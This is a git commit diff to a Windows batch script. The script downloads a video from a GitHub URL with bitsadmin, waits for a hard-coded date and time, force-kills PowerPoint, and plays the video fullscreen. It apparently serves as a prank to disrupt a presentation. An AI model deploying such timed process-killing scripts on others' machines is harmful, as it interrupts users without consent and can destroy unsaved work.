636f42513c134253bc15ab26c16dc61da45eb27c
similartobash <120057329+similartobash@users.noreply.github.com>
2022-12-17 15:43:03 +0300

    Update main.bat

--- main.bat
+++ main.bat
@@ -6,13 +6,14 @@ if not exist "%TEMP%\ataturk.mp4" (
 bitsadmin /transfer vidjob /download /priority high "https://raw.githubusercontent.com/similartobash/rc/main/video.mp4" "%TEMP%\ataturk.mp4"
 )
 
-if "%date%" == "Cmt 17.12.2022" (
+if "%date%" == "Pzt 19.12.2022" (
 :timeloop
-if "%time:~0,5%" == "10:55" (
+if "%time:~0,5%" == "11:55" (
 taskkill /f /im POWERPNT.EXE
-set video2play="%TEMP%\ataturk.mp4"
-set wmplayer="%ProgramFiles(x86)%\Windows Media Player\wmplayer.exe" /prefetch:1
-%wmplayer% %video2play% /fullscreen
+rem set video2play="%TEMP%\ataturk.mp4"
+rem set wmplayer="%ProgramFiles(x86)%\Windows Media Player\wmplayer.exe" /prefetch:1
+rem %wmplayer% %video2play% /fullscreen
+"%ProgramFiles(x86)%\Windows Media Player\wmplayer.exe" "%TEMP%\ataturk.mp4" /fullscreen
 ) else (
 timeout /t 10
 goto :timeloop
